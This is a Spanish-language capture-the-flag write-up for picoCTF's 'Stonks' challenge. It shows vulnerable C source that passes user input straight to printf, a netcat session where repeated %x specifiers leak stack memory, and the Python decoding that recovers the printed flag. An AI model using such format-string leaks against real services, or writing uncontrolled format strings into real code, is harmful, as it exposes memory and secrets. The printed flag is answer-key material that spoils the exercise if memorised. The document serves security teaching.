## Descripción
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c) `nc mercury.picoctf.net 27912`

## Pistas 
Okay, maybe I'd believe you if you find my API key. 

## Solución
- Analizamos el código proporcionado:
```
┌──(kali㉿kali)-[~]
└─$ cat vuln.c  
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}
                                   
```

- Una vez más, se trata de una Format String Vulnerability. Tenemos el printf(user_buf); pero no hay nada en dobles comillas, lo que quiere decir que podemos especificar una cadena de formato.
- Introducimos %x varias veces para recorrer la pila e ir imprimiendo los valores, lo cual es muy conveniente, ya que ahí se encuentra la bandera.

```
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
93dc390804b00080489c3f7f74d80ffffffff193da160f7f82110f7f74dc7093db180293dc37093dc3906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3266633130613130ff86007df7fafaf8f7f82440ed0fb10010f7e11ce9f7f830c0f7f745c0f7f74000ff8687f8f7e0268df7f745c08048ecaff8688040f7f96f09804b000f7f74000f7f74e20ff868838f7f9cd50f7f75890ed0fb100f7f74000804b000ff8688388048c8693da160ff868824ff8688388048be9f7f743fc0ff8688ecff8688e4
Portfolio as of Tue May 23 18:51:16 UTC 2023


2 shares of U
15 shares of TQCT
5 shares of PH
1 shares of Z
60 shares of N
Goodbye!
```

- Copiamos el token y lo pasamos a un convertidor de hexadecimal a ASCII y tenemos como resultado lo siguiente:
```
Ü9°H?tØÿÿÿñÚtÜpÛÜ7	=Ãocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿ}÷úúø÷ø$@í±÷áé÷ø0À÷÷EÀ÷÷@ÿø÷à&÷÷EÀHì¯øh@÷ùo	KttâøhÕuÐût°ÿ8HÈi=¡`ÿ$ÿ8H¾t?Àÿìÿä
```
- La bandera ya está ahí, solamente que se encuentra desordenada. 
```
┌──(kali㉿kali)-[~]
└─$ python3       
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s='ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿ}'
>>> for x in range(0,len(s),4):
...     print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
... 
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
IndexError: string index out of range
picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0>>> 
```

## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}

## Notas Adicionales
**Format String Attack** es un ataque cibernético, el cual se produce cuando los datos enviados a través de una cadena de entrada de caracteres son evaluados como un comando por la aplicación o servidor al cual van dirigidos. De esta forma, el atacante podría ejecutar [código](https://es.wikipedia.org/wiki/C%C3%B3digo_fuente "Código fuente"), leer la pila o causar un error de segmentación en la aplicación en ejecución, lo que provocaría nuevos comportamientos que podrían comprometer la seguridad o la estabilidad del sistema al que van dirigidos.

## Referencias
https://es.wikipedia.org/wiki/Format_String_Attack

https://www.rapidtables.com/convert/number/hex-to-ascii.html